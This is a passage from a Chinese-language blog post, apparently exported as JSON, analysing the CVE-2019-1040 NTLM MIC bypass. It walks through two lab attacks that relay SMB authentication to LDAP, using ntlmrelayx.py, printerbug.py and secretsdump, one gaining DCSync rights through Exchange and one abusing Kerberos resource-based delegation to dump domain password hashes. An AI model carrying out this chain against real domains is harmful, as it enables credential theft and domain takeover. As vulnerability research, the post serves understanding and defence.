取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN\n\n（2）    取消设置NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION。\n\n\n\n### smb中继LDAP流程\n\n为了实现SMB中继LDAP流程，这里使用ntlmrelayx.py工具作为中继\n\n![umDKAS.jpg](https://s2.ax1x.com/2019/09/26/umDKAS.jpg)\n\n\n\nNtlmrelayx中继流程如下：\n\n1、取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN）\n\n![umDMtg.png](https://s2.ax1x.com/2019/09/26/umDMtg.png)\n\nExchange-Attacker-DC交互流量\n\n\n\n![umDQhQ.png](https://s2.ax1x.com/2019/09/26/umDQhQ.png)\n\nExchange向Attacker发送NTLMSSP_NEGOTIATE包内容\n\n\n\n![umD1pj.png](https://s2.ax1x.com/2019/09/26/umD1pj.png)\n\nAttacker将NTLMSSP_NEGOTIATE通过LDAP中继到DC包内容\n\n\n\n可见，在通过LDAP中继时，已经取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN）\n\n\n\n\n\n2、从NTLM_AUTHENTICATE消息中删除MIC以及版本字段\n\n![umD31s.png](https://s2.ax1x.com/2019/09/26/umD31s.png)\n\nExchange-Attacker-DC交互流量\n\n\n\n![umD8cn.png](https://s2.ax1x.com/2019/09/26/umD8cn.png)\n\nExchange向Attacker发送NTLMSSP_AUTH\n\n\n\n![umDYn0.png](https://s2.ax1x.com/2019/09/26/umDYn0.png)\n\nAttacker将NTLMSSP_AUTH通过LDAP中继到DC\n\n\n\n在通过LDAP中继时，NTLM_AUTHENTICATE消息中MIC以及版本字段已被删除\n\n\n\n3、取消设置NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION\n\n![um4w4I.png](https://s2.ax1x.com/2019/09/26/um4w4I.png)\n\nExchange-Attacker-DC交互流量\n\n\n\n![umDtBV.png](https://s2.ax1x.com/2019/09/26/umDtBV.png)\n\nExchange向Attacker发送NTLMSSP_AUTH包内容\n\n\n\n![umDN7T.png](https://s2.ax1x.com/2019/09/26/umDN7T.png)\n\nAttacker将NTLMSSP_AUTH通过LDAP中继到DC包内容\n\n\n\n在通过LDAP中继时，NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION已经被设置为’NOT set’\n\n\n\n## **0x04参考链接**\n\n------\n\n\n\n[1] Exchange Server 2013 一步步安装图解\n\n[2] EnableLDAP over SSL (LDAPS) for Microsoft Active Directory servers\n\n[3] Windows Server 2012 R2 辅助域控制器搭建\n\n[4] 滥用基于资源约束委派来攻击Active Directory\n\n[5] AbusingS4U2Self: Another Sneaky Active Directory Persistence\n\n[6]利用CVE-2019-1040 - 结合RCE和Domain Admin的中继漏洞\n\n[7] 滥用Exchange：远离域管理员的一个API调用\n\n[8] The SYSTEM Account\n\n[9]Waggingthe Dog: Abusing Resource-Based Constrained Delegation to Attack ActiveDirectory\n","source":"_posts/CVE-2019-1040.md","raw":"---\ntitle: 结合CVE-2019-1040漏洞的两种域提权利用深度分析\ndate: 2019-06-26 14:46:10\ntags: windows漏洞分析\ncategories: 技术\ncover: https://s2.ax1x.com/2019/09/26/um6txJ.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n2019年6月，Microsoft发布了一条安全更新。该更新针对CVE-2019-1040漏洞进行修复。此次漏洞，攻击者可以通过中间人攻击，绕过NTLM MIC（消息完整性检查）保护，将身份验证流量中继到目标服务器。\n\n通过这种攻击使得攻击者在仅有一个普通域账号的情况下可以远程控制 Windows 域内的任何机器，包括域控服务器。\n\n<!--more-->\n\n## **0x01 漏洞利用**\n\n------\n\n\n\n### **攻击方式一：Exchange**\n\n**验证环境：**\n\n| **角色** | **系统版本**           | **计算机名** | **IP****地址**  | **域**     |\n| -------- | ---------------------- | ------------ | --------------- | ---------- |\n| Attacker | Ubuntu Server 18.04    | ubuntu       | 192.168.123.69  |            |\n| DC       | Windows Server 2012 R2 | topsec-dc    | 192.168.123.150 | test.local |\n| Exchange | Windows Server 2012 R2 | topsec       | 192.168.123.143 | test.local |\n\n\n\n**验证过程：**\n\n① 环境搭建\n\n- 安装配置域控制器\n- 安装配置Exchange Server，参考[1]\n- 在域中新建一个用于测试的账户test\n\n②执行ntlmrelayx.py脚本进行NTLM中继攻击，设置SMB服务器并将认证凭据中继到LDAP协议。其中--remove-mic选项用于清除MIC标志，--escalate-user用于提升指定用户权限。\n\n![umDaAU.png](https://s2.ax1x.com/2019/09/26/umDaAU.png)\n\n③ 执行printerbug.py脚本，触发SpoolService的bug。\n\n[![umDdNF.png](https://s2.ax1x.com/2019/09/26/umDdNF.png)](https://imgchr.com/i/umDdNF)\n\n④ SpoolService的bug导致Exchange服务器回连到ntlmrelayx.py，即将认证信息发送到ntlmrelayx.py。可以在下图中看到认证用户是TEST\\TOPSEC$。\n\n![umDwh4.png](https://s2.ax1x.com/2019/09/26/umDwh4.png)\n\n接着ntlmrelayx.py开始执行LDAP攻击，加上-debug选项后可以看到更详细的信息。\n\n首先，通过遍历验证中继帐户所在用户组及权限，发现当前账户可以创建用户、可以修改test.local域的ACL，因为域中的Exchange Windows Permissions用户组被允许修改ACL，如下图所示：\n\n![umDB9J.png](https://s2.ax1x.com/2019/09/26/umDB9J.png)\n\n该用户组下的成员正是中继的计算机账户TOPSEC\n\n![umDD39.png](https://s2.ax1x.com/2019/09/26/umDD39.png)\n\n因此脚本会首选修改ACL来提权，因为这相比创建用户的方式更隐秘一些。具体方式是通过LDAP修改域的安全描述符（Security Descriptor），可以在下面的数据包中看到ACL中每一条具体的访问控制条目（ACE，Access Control Entries）：\n\n![umDrcR.png](https://s2.ax1x.com/2019/09/26/umDrcR.png)\n\n\n\n⑤ 完成ACL的修改后，test就可以通过secretsdump.py的DCSync功能dump出所有密码哈希值：\n\n[![umDsj1.png](https://s2.ax1x.com/2019/09/26/umDsj1.png)](https://imgchr.com/i/umDsj1)\n\n\n\n### 攻击方式二：Kerberos委派\n\n**验证环境：**\n\n| **角色** | **系统版本**           | **计算机名** | **IP****地址**  | **域**     |\n| -------- | ---------------------- | ------------ | --------------- | ---------- |\n| Attacker | Ubuntu Server 18.04    | ubuntu       | 192.168.123.69  |            |\n| DC       | Windows Server 2012 R2 | topsec-dc    | 192.168.123.212 | test.local |\n| SDC      | Windows Server 2012 R2 | topsec       | 192.168.123.62  | test.local |\n\n\n\n**验证过程：**\n\n① 环境搭建\n\n- 安装配置域控制器，同时开启LDAPS支持，因为该攻击方式需要添加新的计算机账户，必须在LDAPS进行。开启方法参考[2]\n- 安装配置辅助域控制器，参考[3]\n- 在域中新建一个用于测试的账户topsec，一个域管理员admin\n\n② 和攻击方式一相同，执行ntlmrelayx.py本，使用--delegate-access选项，delegate-access选项将中继计算机帐户（这里即辅助域控制器）的访问权限委托给attacker。\n\n![umD6nx.png](https://s2.ax1x.com/2019/09/26/umD6nx.png)\n\n③ attacker对辅助域控制器(SDC)执行printerbug.py脚本\n\n![umDcB6.png](https://s2.ax1x.com/2019/09/26/umDcB6.png)\n\nprinterbug.py脚本执行成功后，将触发辅助域控制器(SDC)回连Attacker主机，回连使用的认证用户是辅助域控制器(SDC)本地计算机账户TEST/TOPSEC$。\n\nntlmrelayx.py通过ldaps将该用户账户中继到域控服务器(DC)，因为这种攻击方式下所冒用的身份TEST/TOPSEC$并不在Exchange  Windows Permissions组内，不具有修改ACL权限，但是可以通过此身份在DC上添加一个新计算机账户（下图中EJETBTTB$）,  并修改其约束委派授权，授予它对受害计算机（辅助域控制器）的委派权限。\n\n![umDgHK.png](https://s2.ax1x.com/2019/09/26/umDgHK.png)\n\n![umDWND.png](https://s2.ax1x.com/2019/09/26/umDWND.png)\n\n④使用getSP.py脚本，通过-impersonate参数模拟用户admin请求其票证，保存为ccache，admin用户为Domain Admins组的成员，具有对辅助域控制器(SDC)的管理与访问权限。\n\n![umDf4e.png](https://s2.ax1x.com/2019/09/26/umDf4e.png)\n\n⑤ 使用上一步骤中保存的Kerberos服务票证，我们可以在目标主机(SDC)上模拟admin身份，从而执行任何操作，例如使用secretsdump转储哈希值。通过secretsdump dump出所有密码哈希值：\n\n![umD49H.png](https://s2.ax1x.com/2019/09/26/umD49H.png)\n\n## **0x02 漏洞细节**\n\n------\n\n\n此次的攻击流程有如下两个方式：\n\n1、Exchange攻击流程：使用任何AD帐户，通过SMB连接到目标Exchange服务器，并触发SpoolService错误。目标服务器将通过SMB回连至攻击者主机，使用ntlmrelayx将SMB身份验证中继到LDAP。使用中继的LDAP身份验证，为攻击者帐户授予DCSync权限。攻击者帐户使用DCSync转储AD中的所有密码哈希值。\n\n\n\n2、Kerberos委派攻击流程：使用任何AD帐户，通过SMB连接到目标服务器，并触发SpoolService错误。目标服务器将通过SMB回连至攻击者主机，使用ntlmrelayx将SMB身份验证中继到LDAP。使用中继的LDAP身份验证，将目标服务器的基于资源的约束委派权限授予攻击者控制下的计算机帐户。攻击者作为受害者服务器上的任何用户进行身份验证。\n\n\n\n### Exchange攻击流程\n\n下文出现的攻击流量图中,个角色与ip对应关系同上文**验证环境**搭建：\n\n\n\n| **角色** | **系统版本**           | **计算机名** | **IP地址**      | **域**     |\n| -------- | ---------------------- | ------------ | --------------- | ---------- |\n| Attacker | Ubuntu Server 18.04    | ubuntu       | 192.168.123.69  |            |\n| DC       | Windows Server 2012 R2 | topsec-dc    | 192.168.123.150 | test.local |\n| Exchange | Windows Server 2012 R2 | topsec       | 192.168.123.143 | test.local |\n\n\n\n下文标题内容，即为攻击流程，对应流程图中红框所示的流程\n\n如果对SMB协议不是很清楚的读者，可以先参考**技术点分析-客户端与服务器端的SMB通信**一节内容\n\n\n\n#### attacker使用普通AD账户登陆Exchange\n\n在攻击的开始阶段，attacker需要确保拥有一个可使用的AD账号，这是满足触发SpoolService错误的必要条件。\n\n首先attacker利用已拥有的AD账号，连接到远程服务器的打印服务（spoolsv.exe）。\n\n![umDIgA.png](https://s2.ax1x.com/2019/09/26/umDIgA.png)\n\nAttacker通过SMB2协议登陆Exchange流程\n\n\n\n\n\n![umDojI.png](https://s2.ax1x.com/2019/09/26/umDojI.png)\n\nAttacker通过SMB2协议登陆Exchange流量\n\n\n\n成功的通过该阶段，就可以请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。\n\n\n#### 触发SpoolService错误\n\nattacker通过Printerbug脚本，触发Exchange服务器SpoolService错误，强制Exchange服务器通过MS-RPRN RPC接口向attacker进行身份验证。具体细节见技术点分析一章中的SpoolService/printerbug\n\n![umD7ut.png](https://s2.ax1x.com/2019/09/26/umD7ut.png)\n\nAttacker发送SpoolService错误payload流程\n\n\n\n![umDHDP.png](https://s2.ax1x.com/2019/09/26/umDHDP.png)\n\nAttacker通过printerbug向Exchange发送带有payload的流量\n\n\n\n#### Exchange主机向Attacker发送Negotiate Protocol Request\n\n在触发SpoolService错误后，Exchange服务器向Attacker进行身份验证\n\nExchange服务器向Attacker发送NegotiateProtocol Request，这是客户端向服务器发送第一个SMB请求，可参考技术点分析-客户端与服务器端的SMB通信\n\n![umDbHf.png](https://s2.ax1x.com/2019/09/26/umDbHf.png)\n\nExchange向Attacker发送SMB协商请求流程\n\n\n\n![umDLE8.png](https://s2.ax1x.com/2019/09/26/umDLE8.png)\n\nExchange向Attacker发送SMB协商请求流量\n\n在正常的业务场景中，用户想登陆并使用Exchange，往往需要向Exchange服务器发送SMB协商请求流量，以便验证身份并登陆。但由于SpoolService错误，在这里，Exchange向Attacker发送SMB协商请求流量，以便验证身份。这便造成了Attacker可以作为中间人身份中继此身份认证以冒充Exchange欺骗DC的机会。\n\n\n\n#### Attacker将协商请求通过ldap中继到DC服务器\n\n![umDOUS.png](https://s2.ax1x.com/2019/09/26/umDOUS.png)\n\nAttacker向DC中继Exchange的协商请求流程\n\n\n\n![umDX4g.png](https://s2.ax1x.com/2019/09/26/umDX4g.png)\n\nAttacker向DC中继Exchange的协商请求流量\n\n\n\nAttacker作为中间人，将Negotiate ProtocolRequest通过ldap请求中继到ad服务器\n\n在此步骤以及以下攻击流程中，有需要将SMB身份验证通过LDAP中继至DC的环节。由于NTLM协议的工作方式，无法将SMB流量直接通过LDAP中继，因此需要对流量进行修改，而需改流量，势必需要绕过MIC验证，此处便是本次漏洞的重点，详情见 技术点分析-MIC校验绕过部分\n\n\n\n#### attacker向Exchange发送Negotiate Protocol Response\n\n![umDvCQ.png](https://s2.ax1x.com/2019/09/26/umDvCQ.png)\n\nAttacker向Exchange发送Negotiate Protocol Response流程\n\n\n\n![umDx3j.png](https://s2.ax1x.com/2019/09/26/umDx3j.png)\n\nAttacker向Exchange发送Negotiate Protocol Response流量\n\n\n\n#### Exchange向attacker发送Session Setup Request\n\n![umDzgs.png](https://s2.ax1x.com/2019/09/26/umDzgs.png)\n\nExchange向attacker发送Session Setup Request流程\n\n\n\n![umDx3j.png](https://s2.ax1x.com/2019/09/26/umDx3j.png)\n\nExchange向attacker发送Session Setup Request流量\n\n\n\n#### Attacker向DC中继Session Setup Request\n\n![umrSvn.png](https://s2.ax1x.com/2019/09/26/umrSvn.png)\n\nAttacker向DC中继Session Setup Request流程\n\n\n\n![umr9uq.png](https://s2.ax1x.com/2019/09/26/umr9uq.png)\n\nAttacker向DC中继Session Setup Request流量\n\n\n\nAttacker将Exchange发送来的Session Setup Request 中继给DC， DC将包含 CHALLENGE的Response发送给Attacker\n\n\n\n#### Attacker 向exchange发送Session Setup Response（CHALLENGE）\n\n![umrCD0.png](https://s2.ax1x.com/2019/09/26/umrCD0.png)\n\nAttacker 向exchange发送Session Setup Response流程\n\n\n\n![umrPbV.png](https://s2.ax1x.com/2019/09/26/umrPbV.png)\n\nAttacker 向exchange发送Session Setup Response流量\n\n\n\nAttacker 将DC发出的包含challenge的Session Setup Response发送给exchange\n\n\n\n#### exchange向Attacker发送包含了身份验证请求的Session Setup\n\n![umrFET.png](https://s2.ax1x.com/2019/09/26/umrFET.png)\n\nexchange向Attacker发送包含了身份验证请求的Session Setup Request流程\n\n\n\n![umrPbV.png](https://s2.ax1x.com/2019/09/26/umrPbV.png)\n\nexchange向Attacker发送包含了身份验证请求的Session Setup流量\n\n\n\n我们可以看到上图中的认证用户为TEST\\TOPSEC$，而不是运行Exchange的SYSTEM账户，这是因为SYSTEM账户具有太高权限，如果用此帐户对网络资源进行身份验证，则会出现安全问题。所以当访问网络资源时，使用本地计算机的网络帐户对网络进行身份验，（形式为domain\\computername$，即TEST\\TOPSEC$）\n\nExchange收到challenge后，向attacker发送包含了身份验证请求的Session Setup流量\n\n\n\n#### Attacker向 DC中继含有Exchange的身份认证的Session Setup Request\n\n\n\n![umyB9g.png](https://s2.ax1x.com/2019/09/26/umyB9g.png)\n\nAttacker向 DC中继Session Setup Request流程\n\n\n\n![umrkUU.png](https://s2.ax1x.com/2019/09/26/umrkUU.png)\n\nAttacker向 DC中继Session Setup Request流量\n\n\n\nDC认证通过Exchange身份，并向Attcker发送认证通过的Response。\n\n此时，DC对Attacker的身份验证结束，Attacker成功冒用Exchange身份。由于安装Exchange后，Exchange在Active  Directory域中具有高权限，Exchange的本地计算机账户TOPSEC$会被加入用户组Exchange Trusted  Subsystem，该用户组又隶属于Exchange Windows Permissions。ExchangeWindows Permissions组可以通过WriteDacl方式访问Active Directory中的Domain对象，该对象允许该组的任何成员修改域权限，从而可以修改当前域ACL达到提权目的。\n\n使用提权后的用户或计算机可以执行域控制器通常用于复制的同步操作，这允许攻击者同步ActiveDirectory中用户的所有哈希密码。\n\n![umre29.png](https://s2.ax1x.com/2019/09/26/umre29.png)\n\n同步Active Directory中用户的所有哈希密码\n\n\n\n\n\n### Kerberos委派攻击流程\n\n下文出现的攻击流量图中,个角色与ip对应关系同上文**验证环境**搭建：\n\n\n\n| 角色     | 系统版本               | 计算机名  | IP地址          | 域         |\n| -------- | ---------------------- | --------- | --------------- | ---------- |\n| Attacker | Ubuntu Server 18.04    | ubuntu    | 192.168.123.69  |            |\n| DC       | Windows Server 2012 R2 | topsec-dc | 192.168.123.212 | test.local |\n| SDC      | Windows Server 2012 R2 | topsec    | 192.168.123.62  | test.local |\n\n\n\n\n\nKerberos委派攻击流程与Exchange攻击利用，在DC对Attacker的身份验证结束之前的阶段是类似的。区别在于后续提权过程，下面介绍下Kerberos委派攻击后续攻击流程。\n\n\n\n在attacker冒用SDC身份后，由于SDC计算机身份没有修改访问控制列表(ACL)的权限，无法直接提权。而后续提权利用中的S4U2Self不适用于没有SPN的帐户。在域环境中，任何域用户都可以通过MachineAccountQuota创建新的计算机帐户，并为其设置SPN。Attacker通过此方式新建一个域中的计算机账号。这一过程通过LDAP实现并设置账户与密码，如下图\n\n![um5ZGt.png](https://s2.ax1x.com/2019/09/26/um5ZGt.png)\n\nNtlmrelayx工具成功创建计算机账户\n\n\n\n![um46KS.png](https://s2.ax1x.com/2019/09/26/um46KS.png)\n\nDC上可见computers列表中新创建的名为EJETBTTB的计算机\n\n\n\n在域中新的计算机账户EJETBTTB(下图中的service A)建立成功后，后续攻击如下图攻击步骤\n\n![umrmvR.png](https://s2.ax1x.com/2019/09/26/umrmvR.png)\n\n攻击步骤\n\n\n\n#### 攻击者为Service A配置了基于资源的约束委派\n\n由于通过S4U2Self请求到的TGSforwardable标志位为 Non-forwardable,这意味着该TGS服务票据是不可转发的，不可以在接下来的S4U2Proxy中进行转发。但是不可转发的TGS竟然可以用于基于资源的约束委派，S4U2Proxy会接收这张不可转发的TGS。由于我们拥有Service A的计算机账号以及密码，所以在这里可以为Service A到SDC配置了基于资源的约束委派，将默认的约束委派更改为基于资源的约束委派，以便后续攻击。\n\n\n\n#### Service A 调用S4U2Self向认证服务器(SDC)为admin请求访问自身的服务票据.\n\n\n\n![umIVw4.png](https://s2.ax1x.com/2019/09/26/umIVw4.png)\n\n\n\n\n\n通过国外安全研究员Elad  Shami的研究可知，无论服务账号的UserAccountControl属性是否被设为TrustedToAuthForDelegation，  服务自身都可以调用S4U2Self为任意用户请求访问自己的服务票据，也就是说，这里Service A  可以调用S4U2Self向SDC为admin用户申请可访问自身的服务票据.\n\n\n\n#### SDC将为admin用户申请的访问ServiceA的TGS发送给Service A\n\n![umsnJg.png](https://s2.ax1x.com/2019/09/26/umsnJg.png)\n\n\n\n#### Service A通过S4U2Proxy 转发TGS，并为admin申请访问SDC票据\n\n![umsuWQ.png](https://s2.ax1x.com/2019/09/26/umsuWQ.png)\n\n####  \n\n#### SDC将为admin用户申请的访问SDC的TGS发送给Service A\n\n在这里，Service A为Attacker创建并控制，Attacker获得TGS票据，利用该票据以admin身份访问SDC，完成提权\n\n![umslyn.png](https://s2.ax1x.com/2019/09/26/umslyn.png)\n\n\n\n## **0x03技术点分析**\n\n------\n\n\n\n在理清利用流程后，接下来详解利用流程中的技术点\n\n### 客户端与服务器端的SMB通信\n\n补充介绍一些关于SMB通信协议相关内容，通过这部分内容，可以加深对的漏洞流程的理解。对SMB通信协议熟悉的读者，可以跳过此部分\n\n\n\n![umD53d.png](https://s2.ax1x.com/2019/09/26/umD53d.png)\n\n客户端与服务器端的SMB通信流程\n\n\n\n### **SMB2 / Negotiate Protocol**\n\nNegotiate Protocol是在SMB2的任何新TCP会话上发出的第一个SMB2命令，它用于协商要使用的协议版本。\n\n\n\nNegotiate Protocol命令分为如下两部分：\n\n1. Negotiate Protocol Request：客户端向服务器发送第一个SMB请求：“Negotiate ProtocolRequest”。这个请求包含了客户端所支持的各种 SMB Dialect。\n2. Negotiate Protocol Response: 服务器收到该请求后，选择一个它支持的最新版本（比如NTLM 0.12），再通过“Negotiate Protocol Response”回复给客户端。\n\n\n\n**SMB2 / Session Setup**\n\nSMB2 / Session Setup命令用于对用户进行身份验证并获取分配的UserID。此命令通常是SMB2 / Negotiate Protocol阶段完成后从客户端发出的第一个命令。\n\nSession Setup分为如下两部分：\n\n1.Session SetupRequest: Negotiate Protocol阶段结束之后，，客户端请求和服务器建立一个session，在客户端发送的Session Setup Request里，包含了身份验证请求。\n\n\\2. Session SetupResponse: 服务器回复是否通过验证。\n\n### SpoolService/printer bug\n\n在攻击利用流程中，需要使用到一个名为printerbug.py的工具，此工具触发SpoolService/printer bug，强制Windows主机通过MS-RPRN RPC接口向攻击者进行身份验证。\n\nWindows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。\n\n\n\n任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。另外微软表示这个bug是系统设计特点，无需修复。\n\n![umsKzj.png](https://s2.ax1x.com/2019/09/26/umsKzj.png)\n\n\n\n在本次漏洞的利用过程中，我们通过printerbug.py脚本触发了上述bug，强制Exchange服务器对攻击者（192.168.123.69）发起身份验证，而Exchange默认是以SYSTEM身份执行的。\n\n![umDifH.png](https://s2.ax1x.com/2019/09/26/umDifH.png)\n\n下图是printerbug.py执行后的数据包：\n\n![umDkpd.png](https://s2.ax1x.com/2019/09/26/umDkpd.png)\n\n1、第一次身份验证由攻击者向exchange服务器发起，以便可以远程连接到Spoolsv服务，可以看到使用的账号是一个普通的域成员账号test；\n\n2、接着，printerbug.py脚本中调用RpcRemoteFindFirstPrinterChangeNotificationEx()，请求对一个新的打印作业进行更新，并令其将该通知发送给我们指定的attackerhost（192.168.123.69）。这部分数据就是上图中Encrypted SMB3中的一部分。\n\n![umsbtS.png](https://s2.ax1x.com/2019/09/26/umsbtS.png)\n\n3、第二次身份验证便是使Exchange向attackerhost（192.168.123.69）发起的身份验证，用户为TEST\\TOPSEC$，（不是SYSTEM的原因是：如果本地服务使用SYSTEM帐户访问网络资源，则使用本地计算机的网络帐户domain\\computername$对网络进行身份验证）\n\n\n\n### SMB中继LDAP思路以及难点\n\n在攻击利用流程中，需要将SMB身份验证通过LDAP中继至DC，由于NTLM协议的工作方式，无法将SMB流量直接通过LDAP中继，将SMB流量通过LDAP中继难点以及绕过思路如下：\n\n1、默认情况下，SMB中的NTLM身份验证:NEGOTIATE_SIGN为set状态\n\n![umDE6I.png](https://s2.ax1x.com/2019/09/26/umDE6I.png)\n\n2、将此SMB流量中继到LDAP时，由于此时的NegotiateSign设置为set，该标志会触发LDAP签名，而此SMB流量为Attacker从Exchange服务器上中继而来，无法通过LDAP的签名校验，从而被LDAP忽略，导致攻击失败\n\n3、为了防止攻击失败，需要将NEGOTIATE_SIGN设置为Not set\n\n4、MIC保护不被篡改，如果简单的改包，将NEGOTIATE_SIGN设置Not set，将会导致MIC校验不通过\n\n5、需要寻找一种可以绕过MIC校验的方式，以便更改包中的值\n\n6、在绕过MIC校验之后，更改NEGOTIATE_SIGN值为Not set，使得在不触发LDAP签名校验的情况下，将SMB中继LDAP\n\n\n\n### MIC校验\n\nNTLM身份验证由3种消息类型组成：\n\nNTLM_NEGOTIATE，NTLM_CHALLENGE，NTLM_AUTHENTICATE。\n\nNTLM_NEGOTIATE，NTLM_CHALLENGE，NTLM_AUTHENTICATE对应位于SMB协议中的SessionSetup阶段\n\n![umDVXt.png](https://s2.ax1x.com/2019/09/26/umDVXt.png)\n\nClinet与Server交互流程图\n\n\n\n![umDenP.png](https://s2.ax1x.com/2019/09/26/umDenP.png)\n\nClinet与Server交互流量\n\n\n\n![umDm0f.png](https://s2.ax1x.com/2019/09/26/umDm0f.png)\n\nSMB认证协议流程\n\n\n\n为了确保恶意行为者不在传输过程中处理消息，在NTLM_AUTHENTICATE消息中添加了一个额外的MIC（消息完整性代码）字段。\n\n![umDn78.png](https://s2.ax1x.com/2019/09/26/umDn78.png)\n\n存放于NTLM_AUTH中的MIC\n\n\n\nMIC是使用会话密钥应用于所有3个NTLM消息的串联的HMAC_MD5，该会话密钥仅对启动认证的帐户和目标服务器是已知的。\n\n因此，试图篡改其中一条消息的攻击者（例如，修改签名协商）将无法生成相应的MIC，这将导致攻击失败。\n\n\n\n### MIC校验绕过\n\nMicrosoft服务器允许无MIC 的NTLM_AUTHENTICATE消息。\n\n如果想要将SMB身份验证中继到LDAP，并完成中继攻击，可以通过如下步骤：\n\n取消MIC校验以确保可以修改数据包中的内容：\n\n（1）从NTLM_AUTHENTICATE消息中删除MIC\n\n（2）从NTLM_AUTHENTICATE消息中删除版本字段（删除MIC字段而不删除版本字段将导致错误）。\n\n\n\n### LDAP签名绕过\n\n在绕过MIC校验之后，可以修改NEGOTIATE_SIGN值以便将SMB流量顺利通过LDAP签名校验\n\n将NEGOTIATE_SIGN设置为notset以绕过LDAP验证\n\n（1）    取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN\n\n（2）    取消设置NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION。\n\n\n\n### smb中继LDAP流程\n\n为了实现SMB中继LDAP流程，这里使用ntlmrelayx.py工具作为中继\n\n![umDKAS.jpg](https://s2.ax1x.com/2019/09/26/umDKAS.jpg)\n\n\n\nNtlmrelayx中继流程如下：\n\n1、取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN）\n\n![umDMtg.png](https://s2.ax1x.com/2019/09/26/umDMtg.png)\n\nExchange-Attacker-DC交互流量\n\n\n\n![umDQhQ.png](https://s2.ax1x.com/2019/09/26/umDQhQ.png)\n\nExchange向Attacker发送NTLMSSP_NEGOTIATE包内容\n\n\n\n![umD1pj.png](https://s2.ax1x.com/2019/09/26/umD1pj.png)\n\nAttacker将NTLMSSP_NEGOTIATE通过LDAP中继到DC包内容\n\n\n\n可见，在通过LDAP中继时，已经取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN）\n\n\n\n\n\n2、从NTLM_AUTHENTICATE消息中删除MIC以及版本字段\n\n![umD31s.png](https://s2.ax1x.com/2019/09/26/umD31s.png)\n\nExchange-Attacker-DC交互流量\n\n\n\n![umD8cn.png](https://s2.ax1x.com/2019/09/26/umD8cn.png)\n\nExchange向Attacker发送NTLMSSP_AUTH\n\n\n\n![umDYn0.png](https://s2.ax1x.com/2019/09/26/umDYn0.png)\n\nAttacker将NTLMSSP_AUTH通过LDAP中继到DC\n\n\n\n在通过LDAP中继时，NTLM_AUTHENTICATE消息中MIC以及版本字段已被删除\n\n\n\n3、取消设置NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION\n\n![um4w4I.png](https://s2.ax1x.com/2019/09/26/um4w4I.png)\n\nExchange-Attacker-DC交互流量\n\n\n\n![umDtBV.png](https://s2.ax1x.com/2019/09/26/umDtBV.png)\n\nExchange向Attacker发送NTLMSSP_AUTH包内容\n\n\n\n![umDN7T.png](https://s2.ax1x.com/2019/09/26/umDN7T.png)\n\nAttacker将NTLMSSP_AUTH通过LDAP中继到DC包内容\n\n\n\n在通过LDAP中继时，NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION已经被设置为’NOT set’\n\n\n\n## **0x04参考链接**\n\n------\n\n\n\n[1] Exchange Server 2013 一步步安装图解\n\n[2] EnableLDAP over SSL (LDAPS) for Microsoft Active Directory servers\n\n[3] Windows Server 2012 R2 辅助域控制器搭建\n\n[4] 滥用基于资源约束委派来攻击Active Directory\n\n[5] AbusingS4U2Self: Another Sneaky Active Directory Persistence\n\n[6]利用CVE-2019-1040 - 结合RCE和Domain Admin的中继漏洞\n\n[7] 滥用Exchange：远离域管理员的一个API调用\n\n[8] The SYSTEM Account\n\n[9]Waggingthe Dog: Abusing Resource-Based Constrained Delegation to Attack ActiveDirectory\n","slug":"CVE-2019-1040","published":1,"updated":"2020-10-27T09:25:29.241Z","_id":"ckgrozuai006awsa9c6l38sr7","comments":1,"layout":"post","photos":[],"link":"","content":"<p>2019年6月，Microsoft发布了一条安全更新。该更新针对CVE-2019-1040漏洞进行修复。此次漏洞，攻击者可以通过中间人攻击，绕过NTLM MIC（消息完整性检查）保护，将身份验证流量中继到目标服务器。</p>\n<p>通过这种攻击使得攻击者在仅有一个普通域账号的情况下可以远程控制 Windows 域内的任何机器，包括域控服务器。</p>\n<a id=\"more\"></a>\n\n<h2 id=\"0x01-漏洞利用\"><a href=\"#0x01-漏洞利用\" class=\"headerlink\" title=\"0x01 漏洞利用\"></a><strong>0x01 漏洞利用</strong></h2><hr>\n<h3 